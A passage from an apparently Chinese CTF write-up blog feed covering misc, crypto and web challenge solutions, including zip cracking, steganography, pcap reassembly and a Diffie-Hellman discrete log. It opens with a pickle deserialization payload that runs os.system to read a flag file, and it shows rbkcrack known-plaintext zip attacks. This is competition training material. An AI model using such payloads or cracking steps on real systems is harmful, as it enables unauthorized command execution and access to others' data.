<code>STAKcDAKMFMnY2F0IC9DVEY/WW91U2hvdUppdVhpbmcnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu</code>，</p><p>解码得pickle：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;cat /CTF?YouShouJiuXing&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>flag：<code>UNCTF&#123;CTF?YouShouJiuXing&#125;</code></p><p>​    </p><h3 id="电信诈骗"><a href="#电信诈骗" class="headerlink" title="电信诈骗"></a>电信诈骗</h3><blockquote><p>CTFer,你好，我是威震天！其实我在芝加哥大战中没死，现在你只需要打2000RMB到我的银行账户，我就可以用这2000RMB发红包骗取人们的信任，然后穿过股市网络找到震荡波在纽约给我找的新身体，然后我就可以复活了。今天如果你帮了我，复活后我可以入侵股市网络把钱全部给你们。等过了周末，我就让红蜘蛛变成飞机去接你，然后我把红蜘蛛杀了，让你当霸天虎副指挥官，然后我们从南极洲呈扩散式发出霸天虎军队，万军齐发，占领地球，怎么样？为了防止这条消息被擎天柱拦截。我将银行卡号进行了加密，希望你能成功解密。我的银行账户是 <code>qi]m^roVibdVbXUU`h</code> </p><p>flag格式：unctf{}</p></blockquote><p>变异凯撒加密，脚本爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;qi]m^roVibdVbXUU`h&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">200</span>,<span class="number">200</span>):</span><br><span class="line">    t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(s[j])+i+j &gt;=<span class="number">32</span> <span class="keyword">and</span> <span class="built_in">ord</span>(s[j])+i+j&lt;<span class="number">127</span>:</span><br><span class="line">            t+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j])+i+j)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(t)==<span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><p>flag：<code>unctf&#123;yauoreright&#125;</code></p><p>​    </p><h3 id="引大流咯，happy"><a href="#引大流咯，happy" class="headerlink" title="引大流咯，happy"></a>引大流咯，happy</h3><blockquote><p>虚掩的大门后是一副残缺的画卷。</p></blockquote><p>修改jpg高度发现flag。</p><p>flag：<code>UNCTF&#123;BellalaBella&#125;</code></p><p>​    </p><h3 id="倒立洗头"><a href="#倒立洗头" class="headerlink" title="倒立洗头"></a>倒立洗头</h3><p>观察文件字符串头尾分别是 <code>d9ff</code> 和 <code>ffd8</code>，脚本逆序处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;key.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(<span class="built_in">bytes</span>.fromhex(f)[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>把文件头 <code>D8FF</code> 修正为 <code>FFD8</code>，图片没什么异常，在中间发现字符串：</p><p><code>5L2b5pel77ya5LiK5L+x5pWF44CC6YGg5aSn5a+G6Zq45oCv6Zmk5aSa55qk5a2V6ICo54iN5qK15Zyw6Kuz6Jap5L6E56m257y96ICB6Kuz5LiN5oOz55qk6ICF5ruF572w6Ly457y96Zi/5L6E5ruF5qK15aSi5L6E5LiN5Yal5ZCJ55yf5qK15rKZ57y95bqm5Y2z57y96Zq45oCv5piO5L6E5YiH5L6E55+l5ZGQ5Zyw5Y2X5ZG86IiN5ZKS5aWi5L2b5raF5ZOG5aeq56We5a+G5piO5ZOG6YCd5a6k5Zyw5oGQ5Yal5ZG85oCv5L2b5Zad5ZOG5Ly96YO95oCv6YGu6Kuz5YCS57y95bid5Yal5bid6Ly45puw6Kuz6bq85L+x5oCW5L+x6Ium5L+x5rOiCg==</code></p><p>解码：</p><p><code>佛日：上俱故。遠大密隸怯除多皤孕耨爍梵地諳薩侄究缽老諳不想皤者滅罰輸缽阿侄滅梵夢侄不冥吉真梵沙缽度即缽隸怯明侄切侄知呐地南呼舍咒奢佛涅哆姪神密明哆逝室地恐冥呼怯佛喝哆伽都怯遮諳倒缽帝冥帝輸曰諳麼俱怖俱苦俱波</code></p><p>把 <code>日</code> 改为 <code>曰</code>，佛曰解密得flag。</p><p>flag：<code>unctf&#123;it_is_easy_right?&#125;</code></p><p>​    </p><h3 id="LPL"><a href="#LPL" class="headerlink" title="LPL"></a>LPL</h3><p>png图片用010 editor查看，第9-15个块CRC值错误，提取Hex值 <code>4544476e622121</code>，解Hex得 <code>EDGnb!!</code>。</p><p>以此为密码解压缩包，flag.txt 提示 <code>https://www.bilibili.com/bangumi/play/ep431768?from=search&amp;seid=2681339926644936228&amp;spm_id_from=333.337.0.0</code>，以及一个 <code>2021/11/24 14:11</code> 的时间，访问B站视频在评论区找到 <code>2021/11/24 14:11</code> 的评论见flag。</p><p>flag：<code>flag&#123;LpL_zgbr_rNg_eDg777&#125;</code></p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;为响应国家选拔、推荐优秀网络空间安全专业人才，培养学生的创新意识与团队合作精神，提高大学生的网络安全技术水平、创新实践与综合设计能力，推动我国高校网络空间安全专业建设与改革，全国9所高校（闽南师范大学，福州大学至诚学院，重庆大学，陆军工程大学，南京</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>第一届东软杯网络CTF竞赛-DNUICTF</title>
    <link href="https://lazzzaro.github.io/2021/12/05/match-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%9C%E8%BD%AF%E6%9D%AF%E7%BD%91%E7%BB%9CCTF%E7%AB%9E%E8%B5%9BDNUICTF/"/>
    <id>https://lazzzaro.github.io/2021/12/05/match-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%9C%E8%BD%AF%E6%9D%AF%E7%BD%91%E7%BB%9CCTF%E7%AB%9E%E8%B5%9BDNUICTF/</id>
    <published>2021-12-05T12:40:24.000Z</published>
    <updated>2021-12-05T17:56:56.779Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>由大连市公安局作为指导单位，大连东软信息学院主办，网络安全工作室承办，大连东软信息学院网络与信息中心、计算机学院、软件学院，品牌发展部、微光网络工作室协办，品牌发展部与微光网络工作室提供设计支持，大连暗泉信息技术有限公司赞助支持的“暗泉杯”网络安全竞赛将于2021年12月份举行。该竞赛是运用信息安全知识的一次创新性竞赛活动，希望通过这次比赛增强我校学生的安全知识运用能力和经验积累。本次比赛也面向校外开放注册通道，旨在为信息安全领域爱好者提供一个交流和水平展示的舞台。</p><p>本次竞赛采用线上CTF（Capture The Flag，夺旗赛）赛制。选手充分运用自身掌握的各方面的知识与技能，设法解开题目，获得题目中的“Flag”并提交，得到分数，最终根据分数排名。内容涉及Reverse(逆向分析)，Web(Web漏洞利用)，PWN（溢出类），Crypto(密码学)，Misc(混合杂项题)等方面。</p><p>竞赛时间</p><p>2021年12月4日 10：00—2021年12月5日22：00（36个小时）</p><p>报名平台链接：<a href="http://ctf.neusoft.edu.cn/">http://ctf.neusoft.edu.cn/</a></p><p><strong>Rank: 9</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到-签到"><a href="#签到-签到" class="headerlink" title="[签到]签到"></a>[签到]签到</h3><blockquote><p>除特别说明外本次比赛flag的格式统一为 flag{字符串}</p><p>比如下面这个就是一个典型的flag</p><p>flag{Dnui_ctf_2021_s1gn_in}</p><p>将上面的flag提交即可完成答题</p><p>另外本次CTF比赛会根据整体解题情况分批次放出题目 (解不出题时 可以等待下一波新题目放出继续作答)</p><p>请加入QQ群 630995618 或查看平台公告 关注题目动态</p></blockquote><p><code>flag&#123;Dnui_ctf_2021_s1gn_in&#125;</code>。</p><p>​    </p><h3 id="萌新-在哪呢"><a href="#萌新-在哪呢" class="headerlink" title="[萌新]在哪呢"></a>[萌新]在哪呢</h3><blockquote><p>FLAG在哪呢</p></blockquote><p>pdf内容全选复制，打开任一文本编辑器粘贴，发现flag：<code>flag&#123;hey_there_is_no_thing&#125;</code>。</p><p>​    </p><h3 id="只是个PNG，别想太多了-png"><a href="#只是个PNG，别想太多了-png" class="headerlink" title="只是个PNG，别想太多了.png"></a>只是个PNG，别想太多了.png</h3><p>binwalk命令查看png图片：<code>binwalk -e PNG.png</code>，分解出最后一个zlib块，发现flag：<code>flag&#123;zhe_ti_mu_ye_tai_bt_le_XD&#125;</code>。</p><p>​    </p><h3 id="压缩包压缩包压缩包压缩包"><a href="#压缩包压缩包压缩包压缩包" class="headerlink" title="压缩包压缩包压缩包压缩包"></a>压缩包压缩包压缩包压缩包</h3><p>zip压缩包套娃，每一层的密码是文件名，python脚本解套：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">now = <span class="string">&quot;yasuobao.zip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;START &quot;</span>+now)</span><br><span class="line">zfile = zipfile.ZipFile(now)</span><br><span class="line">password = zfile.namelist()[<span class="number">0</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">zfile.extractall(members=zfile.namelist(), pwd=password.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">zfile.close()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.remove(now)</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">names = os.listdir()</span><br><span class="line"><span class="built_in">print</span>(names)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line"><span class="keyword">if</span> name.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> name != now:</span><br><span class="line">now=name</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;END &#x27;</span>+now)</span><br></pre></td></tr></table></figure><p>最后解压得到 <code>23333.zip</code>，打开发现注释提示密码6位数，ARCHPR爆破得756698，解压得flag：<code>flag&#123;Unz1p_i5_So_C00l##&#125;</code>。</p><p>​    </p><h3 id="easysteg"><a href="#easysteg" class="headerlink" title="easysteg"></a>easysteg</h3><p>png图片，二维码用微信扫出内容 <code>某种常见的隐写</code>，用010editor 16进制查看，发现尾部有zip压缩包，提取出来，解压出 <code>_find.png</code>。</p><p>尝试高低位隐写、盲水印等无结果，考虑stegpy：</p><p><code>stegpy _find.png</code></p><p>得到flag：<code>flag&#123;Do_U_Kn0w_Ste9py??&#125;</code>。</p><p>​    </p><h3 id="range-download"><a href="#range-download" class="headerlink" title="range_download"></a>range_download</h3><blockquote><p>Hint: filter: dns</p></blockquote><p>Wireshark打开流量包文件，观察到有很多返回1字节的流，且请求中都带 <code>xxx-xxx/2460</code> 字符串，猜测为文件 <code>flag.7z</code> 的单字节断点下载 ，根据请求与响应特征，用脚本提取出所有1字节，并按相应位置填入数组，以字节形式写入文件。发现缺少第2349位字节，按照0x00-0xff分别填入，生成256个7z文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;range.pcapng&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">x1 = <span class="string">b&#x27;\x0d\x0aContent-Range: bytes &#x27;</span></span><br><span class="line">l1 = <span class="built_in">len</span>(x1)</span><br><span class="line">pos1 = [i.start() <span class="keyword">for</span> i <span class="keyword">in</span> re.finditer(x1, f)]</span><br><span class="line">x2 = <span class="string">b&#x27;\x0d\x0aContent-Type: application/x-7z-compressed\x0d\x0a\x0d\x0a&#x27;</span></span><br><span class="line">l2 = <span class="built_in">len</span>(x2)</span><br><span class="line">pos2 = [i.start() <span class="keyword">for</span> i <span class="keyword">in</span> re.finditer(x2, f)][<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">realpos = [<span class="built_in">int</span>(f[k+l1:k+l1+<span class="number">10</span>][:f[k+l1:k+l1+<span class="number">10</span>].index(<span class="string">b&#x27;-&#x27;</span>)]) <span class="keyword">for</span> k <span class="keyword">in</span> pos1]</span><br><span class="line">realval = [f[k+l2:k+l2+<span class="number">10</span>][<span class="number">0</span>] <span class="keyword">for</span> k <span class="keyword">in</span> pos2]</span><br><span class="line"></span><br><span class="line">out = [-<span class="number">1</span>]*<span class="number">2460</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pos1)):</span><br><span class="line">out[realpos[i]]=realval[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out.index(-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(out[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">out[<span class="number">2349</span>]=i</span><br><span class="line">outbyte = <span class="built_in">bytes</span>(out)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">f&#x27;xxx/flag<span class="subst">&#123;i&#125;</span>.7z&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(outbyte)</span><br></pre></td></tr></table></figure><p>生成的7z文件都加密，爆破无果。</p><p>后面放出提示 <code>filter: dns</code>，重新Wireshark打开流量包，过滤dns流量，发现域名 <code>.nss.neusoft.edu.cn</code> 前的主机名可以组成一串base64编码 <code>cGFzc3dvcmQ6IG5zc195eWRzIQ==</code>，解码有 <code>password: nss_yyds!</code>。</p><p>使用脚本批量尝试解压256个7z压缩包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uncompress</span>(<span class="params">path_name</span>):</span></span><br><span class="line"><span class="keyword">if</span> py7zr.is_7zfile(path_name):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">d_name = <span class="string">&#x27;nss_yyds!&#x27;</span></span><br><span class="line"><span class="keyword">with</span> py7zr.SevenZipFile(path_name,password=d_name, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> sevenZ_f:</span><br><span class="line">sevenZ_f.extractall(path_name.rsplit(<span class="string">&quot;.7z&quot;</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Error when uncompress file! info: &#x27;</span>, e)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;This is not a true 7z file!&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    folder_name = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    os.chdir(folder_name)</span><br><span class="line">    files = os.listdir(folder_name)</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">        f_path = folder_name + os.sep + f</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(f_path):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;解压--&quot;</span>+f)</span><br><span class="line">            uncompress(path_name=f_path)</span><br></pre></td></tr></table></figure><p>运行完成发现 <code>flag194.7z</code> 解压成功，得到一张二维码，</p><p>扫描得到的内容，经hex+base64+base62+base58+base32 解码得flag：<code>flag&#123;6095B134-5437-4B21-BE52-EDC46A276297&#125;</code>。</p><p>​    </p><h3 id="ecryptedzip"><a href="#ecryptedzip" class="headerlink" title="ecryptedzip"></a>ecryptedzip</h3><p>只提供了一个带 <code>README.md</code> 和 <code>LICENSE</code> 两个文件的加密zip压缩包，用ARCHPR弱密码及字典都无法得到密码。</p><p>想到这两个文件经常默认出现在Github库中，随便找一个Github库，下载LICENSE文件，发现大小与压缩包内的LICENSE文件相近，可以采用已知部分明文（至少连续12字节）攻击方式破解。保留下载的LICENSE文件中前几行内容，用rbkcrack工具跑key：</p><p><code>rbkcrack.exe -C ecryptedzip.zip -c LICENSE -p LICENSE.txt</code></p><p>拿到三组key之后进行解密：</p><p><code>rbkcrack.exe -C ecryptedzip.zip -c README.md -k 32cc3495 7f955ff5 58291af3 -d README.md</code></p><p>或直接将key输入ARCHPR的明文攻击模式里的key输入框中，成功解压zip包。</p><p>flag：<code>flag&#123;Kn0wn_pla1ntext_attack_Is_very_Usefully&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="签到-键盘侠"><a href="#签到-键盘侠" class="headerlink" title="[签到]键盘侠"></a>[签到]键盘侠</h3><blockquote><p>UYTGBNM EDCV UYTGBNM TGBUHM YTFVBH QAZXCDE TYUHN EDCTGBF RFVYGN</p><p>flag{} 提交时括号内为大写字母</p></blockquote><p>键盘密码，按字母顺序在键位比划：<code>flag&#123;CLCKOUTHK&#125;</code>。</p><p>​    </p><h3 id="萌新-素数"><a href="#萌新-素数" class="headerlink" title="[萌新]素数"></a>[萌新]素数</h3><blockquote><p>目前768位的素数选择下，rsa等公钥加密算法已经不安全，rsa加密需要进行更大素数的选择，请您选出10个1024位以上的大素数提交给我</p><p><a href="http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn/">http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn/</a></p><p>备用</p><p><a href="http://sushu_5rg35rg4g.nssctf.neusoft.edu.cn/">http://sushu_5rg35rg4g.nssctf.neusoft.edu.cn/</a></p></blockquote><p>页面输入10个1024位以上的素数提交拿flag。生成1025位的素数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"><span class="built_in">print</span>(getPrime(<span class="number">1025</span>))</span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;d6a6a1bc-88e9-4330-83f9-bdd3bdad5401&#125;</code>。</p><p>​    </p><h3 id="silent-peeper"><a href="#silent-peeper" class="headerlink" title="silent_peeper"></a>silent_peeper</h3><blockquote><p>You are just a silent peeper, silently discovering the secret.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;&quot;</span></span><br><span class="line">bs = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (bs - <span class="built_in">len</span>(s) % bs) * <span class="built_in">chr</span>(bs - <span class="built_in">len</span>(s) % bs)</span><br><span class="line"></span><br><span class="line">p = <span class="number">174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843</span></span><br><span class="line">g = <span class="number">41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977</span></span><br><span class="line">a = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">b = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">A = <span class="built_in">pow</span>(g, a, p)</span><br><span class="line">B = <span class="built_in">pow</span>(g, b, p)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(A, b, p) == <span class="built_in">pow</span>(B, a, p)</span><br><span class="line">key = <span class="built_in">pow</span>(A, b ,p)</span><br><span class="line">key = long_to_bytes(key)[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">ciphertext = cipher.encrypt(pad(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cipher&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;A, B = &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>((A, B))))</span><br><span class="line">    f.write(<span class="string">&quot;ciphertext = &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(binascii.hexlify(ciphertext)))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># cipher</span></span><br><span class="line"><span class="comment"># A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016L, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544L)</span></span><br><span class="line"><span class="comment"># ciphertext = ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c</span></span><br></pre></td></tr></table></figure></blockquote><p>Diffie-Hellman密钥交换，已知生成元 $g$、模数 $p$ 和AB根据40位随机数 $a,b$ 生成的各自的数 $A=g^a \pmod p,B=g^b \pmod p$，求共享密钥 $K=g^{ab} \pmod p$。</p><p>$a,b$ 都为40位比较小，可以采用lambda算法解离散对数，解出 $a$ 或 $b$ 即可计算 $K$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">p = <span class="number">174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843</span></span><br><span class="line">g = <span class="number">41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977</span></span><br><span class="line">A, B = (<span class="number">142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016</span>, <span class="number">16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544</span>)</span><br><span class="line">k = GF(p)</span><br><span class="line">B = k(B)</span><br><span class="line">g = k(g)</span><br><span class="line">b = discrete_log_lambda(B,g,(<span class="number">1</span>,<span class="number">2</span>**<span class="number">40</span>))</span><br><span class="line">ciphertext = <span class="string">&#x27;ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c&#x27;</span></span><br><span class="line">key = <span class="built_in">pow</span>(A, b ,p)</span><br><span class="line">key = long_to_bytes(key)[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">m = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(ciphertext))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;</code>。</p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="签到-flag"><a href="#签到-flag" class="headerlink" title="[签到] flag"></a>[签到] flag</h3><blockquote><p><a href="http://47.106.172.144:65333/">http://47.106.172.144:65333/</a></p></blockquote><p>页面不断随机输出flag各位置对应字符，复制，脚本填充：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 